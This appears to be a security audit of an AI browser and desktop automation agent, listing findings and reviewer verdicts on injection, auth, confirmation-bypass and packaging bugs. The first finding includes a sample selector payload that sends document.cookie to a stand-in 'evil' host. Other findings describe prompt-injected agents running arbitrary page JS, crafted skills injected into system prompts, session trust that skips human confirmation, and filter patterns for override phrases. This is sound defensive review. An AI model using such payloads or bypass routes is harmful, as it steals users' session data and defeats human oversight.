finding.evidence: getPageHTML: `const selector = params.selector ? \`.querySelector('${params.selector}')\` : ""` then CDP Runtime.evaluate. waitForSelector: `selector.replace(/'/g, "\\'")` then `document.querySelector('${escaped}')`. getElementCenter: same weak quote-escape. Malicious selector like `x');fetch('//evil?'+document.cookie);//` becomes executable page JS without going through companion L2 evaluate confirmation. Contrast safe paths using JSON.stringify (getElementInfo:640, typeText:711).
finding.fix_hint: Never string-interpolate selectors into Runtime.evaluate. Always JSON.stringify selectors (and values) into JS literals, or use DOM.querySelector CDP APIs with selector as a protocol field only. Unify waitForSelector/getElementCenter with the getElementInfo pattern.
finding.impact: Prompt-injected or compromised agent can run arbitrary JavaScript in any tab the extension can attach to (exfil cookies/storage, form hijack) via 'safe' tools (get_page_html, click via waitForSelector/getElementCenter) without user confirmation dialog.
finding.title: Selector string injection in browser-bridge bypasses evaluate L2 confirmation

verdict.evidence: browser-bridge.ts:605-606: const selector = params.selector ? `.querySelector('${params.selector}')` : ""; expression = `document.querySelector('html')${selector}?.outerHTML...` then safeEvaluate→Runtime.evaluate. browser-bridge.ts:965-966/983-987: escaped = selector.replace(/'/g, "\\'"); expression = `!!document.querySelector('${escaped}')` and getElementCenter same pattern — backslash-before-quote breaks out. server.ts:463 L2_GATE_TOOLS excludes get_page_html/click. Contrast safe paths getElementInfo:640 and waitFor:832 using JSON.stringify(params.selector).
verdict.reason: Cannot refute. getPageHTML still interpolates params.selector into a Runtime.evaluate expression with no escaping; waitForSelector/getElementCenter only do replace(/'/g,"\\'") which is bypassed by a trailing backslash before the quote. Both reach page MAIN world via CDP without L2 confirmation (L2_GATE_TOOLS is only evaluate/osascript_eval/host_read/host_write). Sibling sinks were hardened with JSON.stringify, proving the pattern and that these paths were missed. Impact is arbitrary page JS via get_page_html/click family without the evaluate confirmation dialog.

finding.evidence: configEvents listener: for (const client of clients) { if (client.readyState === WebSocket.OPEN) client.send(message) } — no wsAuth.get(client)?.authenticated. Contrast broadcastToClients at 2713-2718 which requires authenticated===true. Payload only masks llm/vision api_key; spreads full updatedConfig including mcp.servers (env/headers).
finding.fix_hint: Route config fanout through broadcastToClients (or identical auth check); redact mcp.servers env/headers before send.
finding.impact: A local process that forges Origin and opens WS can receive config.updated during the 5s handshake window (and any OPEN unauth socket) whenever settings CLI or another panel saves config—leaking MCP secrets, domain lists, and security flags without completing HMAC.
finding.title: config.updated fanout ignores ws-auth (unauthenticated siphon)

verdict.evidence: companion/src/server.ts:3214-3232 — configEvents.on(...): for (const client of clients) { if (client.readyState === WebSocket.OPEN) client.send(message) } with config: { ...updatedConfig, llm/vision api_key only masked }. Contrast broadcastToClients at 2713-2718 requiring wsAuth.get(client)?.authenticated === true, and handleMessage broadcast at ~3495 same gate. clients.add(ws) at 3250 before wsAuth.set(..., authenticated: false) at 3266; AUTH_TIMEOUT_MS=5000 in ws-auth.ts:38. McpStdioServerConfig.env / McpHttpServerConfig.headers in mcp/types.ts:36-48 are in the unmasked spread.
verdict.reason: Confirmed: configEvents CONFIG_CHANGE_EVENT fanout in server.ts iterates the clients Set with only readyState===OPEN and never checks wsAuth authenticated. clients.add(ws) runs before handshake; AUTH_TIMEOUT_MS=5000 so a forged-Origin local peer can stay OPEN ~5s (and reconnect). Payload masks only llm/vision api_key while spreading full updatedConfig including mcp.servers env/headers, domain lists, and security flags. broadcastToClients and handleMessage.broadcast already require authenticated===true (X3/Y-e); this path was missed. Same-UID file read of config.json is a partial impact overlap but does not refute the auth-boundary bypass (esp. cross-UID loopback).

finding.evidence: Extension path builds a Promise around pendingToolCalls + TOOL_EXECUTION_TIMEOUT_MS (15s) and ws.send(tool.execute). The optional AbortSignal parameter is never registered; grep shows no signal.aborted / abort listener in this path. MCP alone gets signal at executeMcpTool → manager.callTool(..., signal).
finding.fix_hint: On abort (or signal listener in createToolExecutor), reject/finish pendingToolCalls with AbortError, and send a tool.cancel to the extension so CDP work stops.
finding.impact: Stop/new-chat can leave evaluate/navigate/cookie/screenshot/etc. running until completion or 15s timeout; side effects continue after the user intended to halt.
finding.title: chat.abort does not cancel in-flight extension-forwarded tools

verdict.evidence: createToolExecutor(signal?) → extension branch: `return new Promise((resolve, reject) => { ... setTimeout(..., TOOL_EXECUTION_TIMEOUT_MS); pendingToolCalls.set(...); ws.send({type:"tool.execute",...}) })` with zero signal.aborted/addEventListener("abort"). Contrast: `executeMcpTool(..., signal)` → manager.callTool(..., signal) with externalSignal abort listener. chat.abort: `controller.abort(); return {type:"chat.aborted"}` only. adapter: `await executeTool(..., signal)` then later tools `if (signal?.aborted) break`. Extension background: `if (msg.type === "tool.execute") { await browserBridge.execute(...) }` — no cancel. Companion tools also omit signal (same class).
verdict.reason: Independently confirmed: extension-forward tool path (server.ts ~1300-1369 and dispatchToExtension) accepts AbortSignal but never observes it—only pendingToolCalls + 15s timeout + tool.execute send. chat.abort only controller.abort()s the thread; it does not clear pendingToolCalls or send a cancel to the extension. MCP alone wires externalSignal (mcp/client.ts). Adapter awaits the in-flight executeTool; subsequent tools break on signal?.aborted. Extension tool.execute has no cancel path, so side effects continue until completion. Severity lowered high→medium: abort still stops the LLM stream and further tools; residual blast radius is the current tool and is time-bounded by TOOL_EXECUTION_TIMEOUT_MS (15s).

finding.evidence: manager.callTool throws `MCP call aborted: …` but executeMcpTool catch returns `{ success: false, error: enhanceMcpError(...) }` instead of rethrowing. Adapter only rethrows when e.name === 'AbortError' || signal.aborted *inside executeTool catch* — soft return never throws, so classifyError path treats it as non_recoverable error rather than chat.aborted rollback.
finding.fix_hint: If err message matches MCP call aborted / externalSignal.aborted, rethrow an AbortError (or check signal after executeMcpTool and throw) so adapter rollback + chat.aborted path runs.
finding.impact: User stop may surface as 不可恢复错误, persist a failed tool_result, and skip clean AbortError rollback of the round’s assistant message.
finding.title: MCP abort is cancelled at SDK but soft-failed as a normal tool error

verdict.evidence: mcp/client.ts:328 throws new Error(`MCP call aborted: …`) (not AbortError). server.ts:2494-2510 catch returns {success:false, error:enhanceMcpError(...)} including abort branch at 2536-2538. server.ts:1292-1296 outer catch also soft-returns. adapter.ts:714 addMessage tool_result; 782-806 classifyError→non_recoverable→chat.error `不可恢复错误`; abort rethrow only at 848/880 when executeTool throws. security.ts:687 default non_recoverable; no 'aborted'/'cancelled' patterns. Mitigations: message-router.ts:610-616 chat.abort→chat.aborted; soft pair avoids dangling tool_calls.
verdict.reason: Confirmed: MCP external abort throws plain Error('MCP call aborted…'), executeMcpTool soft-returns enhanceMcpError (and createToolExecutor would soft-swallow rethrows too). Adapter only rethrows AbortError/signal.aborted inside executeTool's catch, so soft success:false never triggers deleteMessagesFrom rollback. classifyError has no abort/cancel patterns → non_recoverable → '不可恢复错误' + chat.done, after tool_result is already persisted. Severity medium not high: chat.abort still returns chat.aborted immediately, and the soft tool_result pairs with tool_calls so OpenAI dangling-tool_calls corruption is avoided.

finding.evidence: executeMcpTool calls securityConfirmations.request(send, details) with no third-arg { originWs: ws }. executeMcpMetaTool is the same (≈2601). Companion tools correctly pass { originWs: ws } (≈1241-1249). security-confirmation.ts respondFrom only enforces origin when pending.originWs is set; if undefined, any sourceWs may resolve. Impact class matches C-SEC-2 for multi-panel / second authenticated loopback client.
finding.fix_hint: Pass { originWs: ws } as the third argument in both executeMcpTool and executeMcpMetaTool request() calls; add an integration test that a non-origin socket cannot resolve.
finding.impact: A second authenticated WebSocket client (another Side Panel, scripted local peer post-handshake) can approve MCP file-write/exec/egress/resource-read while the user who triggered the call never clicks OK.
finding.title: MCP confirmations omit originWs — any authenticated WS peer can approve

verdict.evidence: companion/src/server.ts executeMcpTool: securityConfirmations.request(send, { toolName, dangerousApis: mcpCaps, ... }) with only two args — no { originWs: ws }. executeMcpMetaTool same at ~2601-2610. Contrast companion tools ~1241-1249 always pass { originWs: ws }; history.export ~3422-3429 passes { originWs: ws }. security-confirmation.ts respondFrom: if (pending.originWs !== undefined && pending.originWs !== sourceWs) return origin_mismatch — when originWs omitted, any sourceWs with confirmation_id resolves. send callback only ws.send on the tool-call ws (unicast). Extension: single background WSClient; handleCompanionMessage chrome.runtime.sendMessage fans to panels on one peer. tests/security-confirmation-origin.test.ts: '[backward compat] request() without originWs still works; any socket may respond'.
verdict.reason: Confirmed: executeMcpTool (~2417-2430) and executeMcpMetaTool (~2601-2610) call securityConfirmations.request without { originWs: ws }, while companion tools and history.export bind origin; respondFrom only enforces origin when pending.originWs is set, so any authenticated sourceWs can resolve if it knows confirmation_id. Impact is overstated for high: confirmation.request is unicast to the originating socket (not broadcast), ids are randomUUID and not logged on MCP request, multi Side Panel shares one extension WS, and an authenticated second peer can already self-trigger/self-approve tools without cross-approving. Project already leaves many non-nonce confirmations unbound by design (evaluate). Residual real issues: incomplete C-SEC-2 hygiene on MCP; rejectAll on any peer disconnect cancels unbound MCP prompts (deny/DoS, not silent approve).

finding.evidence: Executor passes client-area pixels (pointClient). Win path converts via ClientToScreen (computer-input.ps1:284-288). Darwin cuInject posts CGPoint(x: px, y: py) directly with no window-bounds offset: `CGEvent(... mouseCursorPosition: CGPoint(x: px, y: py) ...)` after only `cuActivatePid(pid)`. Same pattern in host-skylight.swift:991-1018. Locate chain explicitly produces client space (locate-chain.ts pointClient = img - shot.client).
finding.fix_hint: In cuInject, resolve CGWindow bounds (or AX frame) for windowId and add origin (+ title-bar/client offset from screenshot.client) before CGEvent; mirror Assert-Landing/WindowFromPoint on darwin. Add fixture test: known window at non-zero origin, inject (10,10) must hit that screen point.
finding.impact: Clicks/drags/scrolls on macOS land near global (clientX, clientY) rather than target window client origin—mis-clicks into wrong UI or desktop; occlusion/foreground recoveries cannot compensate. User-approved task draft executes at wrong physical targets.
finding.title: macOS cuInject treats client coords as screen coords (no ClientToScreen)

verdict.evidence: host.swift cuInject click: CGEvent(..., mouseCursorPosition: CGPoint(x: px, y: py), ...) after cuActivatePid only (lines ~917-935); no bounds lookup. darwin-adapters.ts click: --x/--y = Math.round(client x/y). executor.ts injects pointClient. locate-chain.ts: pointClient = img - shot.client. types.ts: client is IMAGE coordinates. computer-input.ps1: ClientToScreen for same contract. host-skylight.swift same CGPoint(px,py) pattern (~1001-1018).
verdict.reason: Confirmed end-to-end: executor/locate-chain pass client-area pixels; Windows converts via ClientToScreen; Darwin MacInputInjector forwards x/y unchanged and host.swift/host-skylight.swift post CGEvent mouseCursorPosition as CGPoint(x:px,y:py) with only cuActivatePid—no rect+client offset. CGEvent positions are global screen points, so clicks land near global (clientX,clientY). Foreground/occlusion/OUT_OF_BOUNDS/preview do not convert. Scroll/drag have additional separate bugs but do not refute the click path defect.

finding.evidence: reL2() returns true without dialog when `trust.isTrusted(sessionId, app)`. Grant runs on every initial host_computer L2 approval: `getComputerSessionTrust().grant(sessionId, String(finalParams.app))`. Same reL2 is used for caution danger (`scan.regionLevel === "caution"` → reL2 at executor.ts:914-922), dialog/FOREGROUND-YIELD, budget, uncross, AND experimental TinyClick G4 (executor.ts:950-955). G4 docs require human re-L2 never auto-inject; session trust collapses that after one task L2.
finding.fix_hint: Scope auto-approve allow-list (e.g. only self-UI/budget), or require `dangerousApis` ∈ {budget, self_ui} for suppression; force interactive confirm when dangerousApis includes computer.danger_detected or computer.experimental_suggestion. Never grant experimental through session trust.
finding.impact: After one approved computer task for an app, mid-task 'delete/remove' caution, foreign-window yield, and uncalibrated TinyClick click suggestions proceed with zero further human confirm—session-level trust abuse / confirmation fatigue bypass of the safety model.
finding.title: Session trust auto-approves all re-L2 including danger-caution and TinyClick G4

verdict.evidence: companion/src/computer/executor.ts reL2 (606-622): if (trust.isTrusted(deps.sessionId, params.app)) { log("computer.task.reconfirm.auto_approved", ...); return true } — no check of reason/dangerous. Same reL2 used at caution (914-922 computer.danger_detected), G4 (950-955 computer.experimental_suggestion), FOREGROUND-YIELD (1373-1379), uncross (846-850, 976-980), budget (744). companion/src/server.ts (933-935): after initial L2 approve, getComputerSessionTrust().grant(sessionId, String(finalParams.app)). companion/src/computer/session-trust.ts: process-lifetime map keyed by (sessionId, appToken); only suppresses re-L2. G4 still documented as per-hit human gate (model-state-messages.ts:163; executor comments 780-781, 839-841, 925-927) but only path is reL2. Hard region pay/captcha remains throw DANGER_HARD_DENY (903-912) outside reL2. Test computer-executor.test.ts "session trust suppresses re-L2" expects confirm.captured.length === 0.
verdict.reason: Confirmed: reL2() auto-returns true for any trusted (sessionId, app) with no reason/dangerous exemptions; grant() runs on initial host_computer L2 before the executor, so caution, FOREGROUND-YIELD, uncross/budget, and TinyClick G4 all skip dialogs in the same task. Hard DANGER_HARD_DENY and credential hard-denies still work, so not critical. G4/docs still claim per-hit human confirm, which session trust falsifies.

finding.evidence: MacInputInjector.click passes `--check-occlusion`. cuInject accepts `checkOcclusion`/`checkOnscreen` parameters but the body only checks Secure Input and estop flag, then injects—no WindowFromPoint/AX hit-test, no use of checkOcclusion/checkOnscreen booleans. Comments claim occlusion is defense-in-depth for TOCTOU between raise and inject; Windows implements Assert-Landing (computer-input.ps1:321-332).
finding.fix_hint: Implement CGWindowList / AX hit-test at landing point; refuse OCCLUDED when top window owner PID ≠ target. Fail-closed if check flags set and probe fails.
finding.impact: Overlay/notification/Chrome window can sit under the cursor between ensureForeground and CGEvent post; click reports ok while landing on non-target (class of b0faek/psl8ci bugs the raise path tried to fix).
finding.title: macOS --check-occlusion / --check-onscreen flags are dead code

verdict.evidence: host.swift:908-936 cuInject(checkOcclusion, checkSecureInput, checkOnscreen, estopFlag): only `if checkSecureInput && IsSecureEventInputEnabled()` and estopFlag path; then cuActivatePid + CGEvent posts; no branch on checkOcclusion/checkOnscreen. Grep of companion/src/host-use: checkOcclusion|checkOnscreen only at argv.contains parse (host.swift:472, host-skylight.swift:541) and signatures—never in bodies. darwin-adapters.ts:497-503 click passes "--check-occlusion" after ensureForeground; :519-522 typeText passes "--check-onscreen"; comments :465-468 claim click flag is defense-in-depth for raise→inject TOCTOU. Windows computer-input.ps1:321-332 Assert-Landing does GetForegroundWindow + WindowFromPoint GA_ROOT OCCLUDED fail-closed—no Darwin equivalent.
verdict.reason: Confirmed dead code: argv parses --check-occlusion/--check-onscreen into cuInject bools in host.swift and host-skylight.swift, but neither body ever reads checkOcclusion/checkOnscreen—only checkSecureInput and estopFlag gate, then cuActivatePid + CGEvent post returns ok. TS MacInputInjector.click/typeText still pass the flags; comments claim TOCTOU defense-in-depth that does not exist. Plan H8/X1 and Windows Assert-Landing are not implemented on Darwin. Severity not high because ensureForeground (fail-closed) plus host cuActivatePid already address steady-state Chrome-frontmost misroute (b0faek class); residual is unguarded race/overlay/Spaces honesty, not total lack of raise.

finding.evidence: Companion emits `chat.token` with thread_id (adapter.ts:451) but UI does: `case "chat.token": streamingRef.current = msg.content; dispatch(SET_STREAMING)` with no msg.thread_id check. chat.done commits via `thread_id: activeThreadRef.current` and content from streamingRef. SET_ACTIVE_THREAD clears state.streamingContent/isProcessing (agentStore.tsx:225-232) but never clears streamingRef.current (only cleared on chat.done/aborted at useWebSocket.ts:155,178). Switch mid-stream → later tokens reappear on wrong thread; chat.done can ADD_MESSAGE the previous thread's assistant text onto the newly selected thread.
finding.fix_hint: Ignore chat.token/done/error/abort unless msg.thread_id === activeThreadRef.current; clear streamingRef on SET_ACTIVE_THREAD/ADD_THREAD; optionally buffer by thread_id map.
finding.impact: User-visible wrong-thread contamination; possible dual-display of secret/tool-output content; history UI desync vs companion storage until reload.
finding.title: Cross-thread stream commit: chat.token/done ignore thread_id; streamingRef survives SET_ACTIVE_THREAD

verdict.evidence: useWebSocket.ts chat.token: `streamingRef.current = msg.content; dispatch(SET_STREAMING)` with no msg.thread_id check. chat.done: `const content = streamingRef.current; ... thread_id: activeThreadRef.current` (ignores msg.thread_id). streamingRef only cleared at done/aborted (lines 155,178). agentStore SET_ACTIVE_THREAD sets streamingContent:"" and isProcessing:false but cannot clear the useRef. adapter.ts still emits thread_id on chat.token (451) and chat.done (524). ThreadList handleSelect only SET_ACTIVE_THREAD + thread.select, no chat.abort.
verdict.reason: Independently confirmed: chat.token/done never compare msg.thread_id; chat.done commits streamingRef content with thread_id: activeThreadRef.current. SET_ACTIVE_THREAD clears streamingContent/isProcessing but not streamingRef (only cleared on done/abort). ThreadList switch does not abort. Mid-stream switch then later tokens reappear on the new thread and chat.done can ADD_MESSAGE the previous stream onto the newly selected thread; companion storage remains correct for the source thread, so UI desyncs until reload/reselect. Same activeThreadRef stamping also affects chat.error/tool.start. No tests or feature-flag mitigations found.

finding.evidence: `evaluate`: `const sanitizedCodeResult = this.sanitizer.sanitizeText(params.code); const codeToExecute = sanitizedCodeResult.sanitized` then `safeEvaluate(tabId, codeToExecute)`. sanitizeText (page-sanitizer.ts:94-114) replaces substrings matching /jailbreak/gi, /ignore\s+...instructions?/gi, Chinese 忽略…指令, etc. with `[FILTERED:…]` — designed for page text/HTML, not executable code. Companion confirmation/security_token bind the original code; extension may run a mutated body.
finding.fix_hint: Never run sanitizeText on evaluate code. Use sanitizeText only for get_page_text/get_page_html (and similar read paths). Execute params.code verbatim after companion gate.
finding.impact: Silent semantic change of user-approved evaluate code; legitimate automation containing common words breaks; integrity of confirmed tool execution is violated.
finding.title: evaluate executes prompt-injection-filtered rewrite of approved JS

verdict.evidence: browser-bridge.ts evaluate(): `const sanitizedCodeResult = this.sanitizer.sanitizeText(params.code); const codeToExecute = sanitizedCodeResult.sanitized` then `safeEvaluate(tabId, codeToExecute)`. page-sanitizer.ts sanitizeText(): comment "detect hidden prompt injection patterns"; replaces e.g. /jailbreak/gi and /ignore\s+(?:all\s+)?(?:previous\s+)?instructions?/gi with `[FILTERED:…]`. Correct adjacent use is getPageText sanitizing document text OUTPUT only. security-policy bindingPayloadFor("evaluate") = String(params?.code||"") on companion before dispatch of unmodified finalParams.
verdict.reason: Confirmed: evaluate applies page-sanitizer.sanitizeText to params.code and executes the rewritten string via safeEvaluate. sanitizeText is designed for prompt-injection filtering of page text (replace jailbreak/ignore-instructions/etc. with [FILTERED:…]), not JS. Companion security_token/bindingPayloadFor and user confirmation bind the original params.code; tool.execute forwards that original; only the extension mutates post-approval. Cannot refute the integrity bug. Downgraded from high: does not skip the evaluate confirmation gate, does not inject attacker-chosen code (fixed FILTERED tokens), patterns rarely appear in real automation, and mutations usually SyntaxError rather than privilege escalation.

finding.evidence: handleAutoApproveDangerousChange and handleGodModeToggle/Confirm only `dispatch({ type: "SET_CONFIG", ... })` plus local ADD_SECURITY_AUDIT. UI immediately shows `checked={config.allow_all_schemes === true}` and red 已启用 badge (lines 406-417). Persistence is only handleSave → `chrome.runtime.sendMessage({ type: "config.set", config })` (lines 70-73). Companion is authoritative for gates (server.ts skipConfirmation uses security.allow_all_schemes). Disarm path: uncheck sets local false without config.set → UI says off while Companion still armed.
finding.fix_hint: On security toggle confirm, immediately send config.set with nested/flat security fields; show pending/synced status; refuse to show 已启用 until companion config.updated ack.
finding.impact: False sense of safety after disarm without Save; false sense of arming without Save; highest-risk switches should not depend on deferred bulk save.
finding.title: God-mode / auto-approve toggles only update local state until Save

verdict.evidence: SettingsSlideout.tsx:113-114 only SET_CONFIG for auto_approve_dangerous; 121-145 disarm sets allow_all_schemes:false + local audit "已关闭 God-mode（恢复协议保护...）" with no config.set; 147-169 arm after phrase sets allow_all_schemes:true + audit "已启用" still local-only; 406-417 checked={config.allow_all_schemes===true} and 已启用 badge; 70-73 handleSave alone sends chrome.runtime.sendMessage({type:"config.set",config}); 209-217/970 close without save is TOGGLE_SETTINGS only. background/index.ts:395-400 config.set → saveExtensionConfig + wsClient.send. companion message-router nests flat flags under security.*; server.ts:691-692 skipConfirmation uses securityConfig.auto_approve_dangerous||allow_all_schemes from companion getConfig().
verdict.reason: Confirmed: handleAutoApproveDangerousChange / handleGodModeToggle / handleGodModeConfirm only dispatch SET_CONFIG (+ local ADD_SECURITY_AUDIT); checkbox and red 已启用 badge bind to agentStore; companion is only updated on handleSave→config.set. Close/X is TOGGLE_SETTINGS with no discard and no config.set. Disarm-without-Save yields false sense of safety if god-mode was already persisted on companion (gates still skip). Arm-without-Save is fail-closed. Severity lowered from high: deferred bulk-save matches rest of Settings, arm path fails closed, and exploit requires prior intentional arm + user not saving—not remote gate bypass.

finding.evidence: parseCraftedSkill: `const type = typeMatch ? typeMatch[1].trim() as "prompt_template" | "tool_chain"` — cast only, no runtime allowlist. message-router auto-saves via importSkill + activate. getGlobalKnowledge: any site_knowledge/domain_knowledge with `!s.site` is always injected. Crafted body can therefore land as invisible global knowledge (list() filters knowledge types out of skill list) without use_skill.
finding.fix_hint: In parseCraftedSkill (and importSkill if desired for craft path), allowlist type to prompt_template|tool_chain only; reject or coerce others. Do not auto-activate knowledge types. Prefer yaml.dump for serialization.
finding.impact: Prompt-injection in a conversation (or a misbehaving model) can craft a skill that persists under ~/.cmspark-agent/skills/ and is injected into subsequent system prompts as Global Knowledge, bypassing the compact skill index / use_skill gate.
finding.title: skill.craft does not allowlist type — LLM can emit site_knowledge/domain_knowledge and auto-inject into every system prompt

verdict.evidence: skill-craft.ts:176 `const type = typeMatch ? typeMatch[1].trim() as "prompt_template" | "tool_chain" : "prompt_template"` — cast only. craftSkillToMarkdown writes `type: ${skill.type}`. message-router.ts:1376-1379 auto importSkill+activate. skill-engine loadFromDir uses parsed.data.type unchecked; list() filters out site_knowledge/domain_knowledge; resolveKnowledgeIdsForThread auto includes getActiveKnowledgeForThread; buildSystemPrompt knowledge path uses getEntriesSummary||getKnowledgeSummary (body inject). SkillCraftPanel skips preview when auto_saved. getGlobalKnowledge returns !site knowledge types but production chatCreate always supplies knowledgeIds (message-router ~374-399).
verdict.reason: Confirmed: parseCraftedSkill only TypeScript-casts type (no allowlist); craftSkillToMarkdown + importSkill persist any type; skill.craft auto-saves and auto-activates without UI review (auto_saved skips preview); list() hides knowledge types; activated domain_knowledge/site_knowledge inject body via knowledgeIds/getKnowledgeSummary without use_skill. Impact overstated as universal Global Knowledge: production always passes knowledgeIds so getGlobalKnowledge is not the normal chat path; default knowledge mode is auto (active + site only). skill.craft is UI/WS-triggered, not an agent tool. Partial sanitizer exists. Downgrade high→medium.

finding.evidence: codesign --force --deep --sign - --options runtime (identity '-') then codesign --verify. No notarytool/xcrun notarize; no Team ID. release.yml documents binary is not codesigned/notarized for Gatekeeper/SmartScreen. Windows build-windows-exe.ps1 only uses signtool remove (strip), never sign.
finding.fix_hint: Obtain Apple Developer ID + Windows code-signing cert; add codesign --sign "Developer ID Application: …" + notarytool submit/staple in create-dmg.sh; signtool sign on Windows artifacts; pin certs via CI secrets; fail release if unsigned.
finding.impact: Internet-distributed DMG/zip triggers Gatekeeper quarantine and SmartScreen; TCC/trust is fragile under ad-hoc identity; users can be trained to click-through warnings, weakening the malware barrier for a privileged agent (debugger, cookies, desktop automation).
finding.title: No Developer ID / notarization / Authenticode — only ad-hoc codesign

verdict.evidence: scripts/create-dmg.sh:96-98: codesign --force --deep --sign - --options runtime --entitlements "${ENTITLEMENTS}" "${APP_BUNDLE}"; scripts/build-windows-exe.ps1:156-161: 'Remove Authenticode signature' via signtool remove only; .github/workflows/release.yml:122-124: 'binary itself is **not** codesigned/notarized (deferred pending certificates). macOS Gatekeeper / Windows SmartScreen may warn.'; no notarytool/Developer ID/signtool sign in packaging CI.
verdict.reason: Confirmed: create-dmg.sh uses only ad-hoc codesign (--sign -) with hardened runtime; no notarytool/Developer ID; build-windows-exe.ps1 only runs signtool remove, never sign; release.yml explicitly documents non-codesigned/non-notarized binaries. This is real distribution-trust debt for a privileged agent, but severity high overstates it: it is a documented certificate long-pole (not a silent bug), Gatekeeper/SmartScreen still warn, Node runtime is sha256-verified in package.sh, and ad-hoc deep-sign was intentional for TCC stability. No RCE/auth bypass; residual risk is supply-chain UX and TeamID-less TCC identity.

finding.evidence: if [ -f companion/dist/cmspark-host ]; then cp …; else echo "[package] WARNING: companion/dist/cmspark-host not built — run 'npm run build:host'…". Makefile package-macos only does build build-tray (no build:host). release.yml package job never invokes build:host. Missing host is non-fatal.
finding.fix_hint: On macos-* in package.sh and Makefile package-macos: run npm run build:host; require companion/dist/cmspark-host exists or exit 1; add release.yml step to assert staged cmspark-host + cmspark-tray before upload.
finding.impact: Tagged GitHub Release macOS zip can ship without host-use/computer-use native binary; host_read/host_write and related tools ENOENT at runtime while package job still succeeds — incomplete product under a green release.
finding.title: cmspark-host not built or hard-gated in package/release — silent incomplete macOS ship

verdict.evidence: scripts/package.sh:149-157: if [ -f companion/dist/cmspark-host ]; then cp ...; else echo "[package] WARNING: companion/dist/cmspark-host not built — run 'npm run build:host'..."; fi (non-fatal). Makefile:136 package-macos: build build-tray (no build:host). companion/package.json: build="tsc ...", build:host="bash src/host-use/darwin/build-host.sh" (separate). .github/workflows/release.yml package job: only bash scripts/package.sh ${{ matrix.platform }} after npm ci; no build:host. postinstall builds Swift tray only, not cmspark-host.
verdict.reason: Confirmed: package.sh only optionally copies companion/dist/cmspark-host (else WARNING, exit 0). Makefile package-macos depends on build+build-tray only; npm run build is tsc-only; build:host is a separate script and is never invoked by release.yml. Clean CI/tag macOS zip can ship without the native host binary while the job stays green; Darwin host_read/host_write/computer-use/biometric/estop then ENOENT at runtime. No hard gate, test, or feature-flag mitigation closes this.

finding.evidence: mockWs sets readyState OPEN with send no-op; comment admits path: "mockWs.send is a no-op, so the request times out at the 45s confirmation gate". Imports createToolExecutor from server with no _*-setup / CMSPARK_DATA_DIR pin. security-confirmation.ts DEFAULT_SECURITY_CONFIRMATION_TIMEOUT_MS = 45000.
finding.fix_hint: Pin CMSPARK_DATA_DIR; wire mock send to capture confirmation_id and respond false immediately (or inject a short-timeout SecurityConfirmationManager); assert confirmation was requested rather than awaiting default timeout.
finding.impact: Adds ~45s wall time per run; if developer config has auto_approve_dangerous, path can instead wait TOOL_EXECUTION_TIMEOUT_MS (15s) for a tool.result that never arrives. Flaky local behavior and CI latency; weak signal (any denial/timeout passes).
finding.title: evaluate-token integration test waits full 45s confirmation timeout with mock WS and no DATA_DIR isolation

verdict.evidence: evaluate-token.test.ts:11-13 mockWs={readyState:1,send:no-op}; :30-35 comment admits 45s confirmation timeout; no _security-gates-setup import. server.ts:717-724 unavailable only if readyState!==OPEN; :691-710 skipConfirmation=auto_approve||allow_all_schemes||...; :1338-1343 TOOL_EXECUTION_TIMEOUT_MS=15000 on missing tool.result. security-confirmation.ts:6 DEFAULT_SECURITY_CONFIRMATION_TIMEOUT_MS=45000. config.ts:189 auto_approve_dangerous default false but real ~/.cmspark-agent used without DATA_DIR pin (_security-gates-setup.ts:1-19 documents the anti-pattern).
verdict.reason: Confirmed: mockWs readyState OPEN + no-op send forces SecurityConfirmationManager's full 45s timeout (DEFAULT_SECURITY_CONFIRMATION_TIMEOUT_MS); early 'unavailable' only when !OPEN. File has no CMSPARK_DATA_DIR/_*-setup isolation unlike security-gates, so developer auto_approve_dangerous/allow_all_schemes can skip L2 and hit TOOL_EXECUTION_TIMEOUT_MS (15s) instead—still success:false. Assertion only checks success===false (weak signal; would pass pre-strip invalid-token path too). Not a production vuln—test latency/isolation/oracle quality—so severity high→medium. Intermittent fail/pass flakiness overstated.

finding.evidence: ws-auth-handshake header: "The production gate lives inside startServer()'s connection handler, which NO test calls directly… we replicate the auth gate here". startAuthedServer() rebuilds challenge/handshake/timeout logic. server.ts comment: "Keep in sync with … ws-auth-handshake.test.ts (which replicates this exact gate, since no test calls startServer())". Same pattern in ws-origin-handshake verifyClient mirror.
finding.fix_hint: Extract connection-handler auth into a pure/testable function used by startServer, or boot startServer against ephemeral port + temp DATA_DIR with UDS lock disabled for tests.
finding.impact: Production can add post-auth messages (e.g. computer.state), change markPaired, or alter unauthenticated-message handling without tests failing. Trust-root regressions reappear as silent drift.
finding.title: WS auth and Origin gates never exercise production startServer(); tests reimplement the gate

verdict.evidence: ws-auth-handshake.test.ts:7-12 admits production gate is in startServer and 'NO test calls [it] directly'; reimplements via startAuthedServer (L184-231) which on success only sends auth.ok+connected. server.ts:3327-3355 documents the same ('replicates this exact gate, since no test calls startServer()') and on success also markPaired() + computer.state. ws-origin-handshake.test.ts:18-23 re-types verifyClient while calling production isAllowedWsOrigin. Grep of companion/tests finds no startServer() calls; suites use bare WebSocketServer. Mitigations: verifyProof/issueChallenge unit tests in same file; isAllowedWsOrigin in ws-origin.test.ts; markPaired in ws-auth-paired-marker.test.ts; real outbound filter in computer-broadcast-auth.test.ts.
verdict.reason: Confirmed: no test calls production startServer(); ws-auth-handshake startAuthedServer() and ws-origin-handshake verifyClient are intentional mirrors. Production already diverges (markPaired + computer.state after auth.ok; early unauth gate before validateWsMessage) while mirror tests stay green—so wiring/side-effect drift risk is real. Severity is not high: this is documented test architecture, not a live auth bypass; trust math uses production verifyProof/issueChallenge/isAllowedWsOrigin (unit-tested), markPaired has its own unit tests, outbound auth uses real broadcastToClients, and startServer is hard to boot in-process (UDS lock, process.exit, MCP, singleton wss). Residual impact is mainly untested attachment of the gate inside startServer, not unreimplemented crypto.
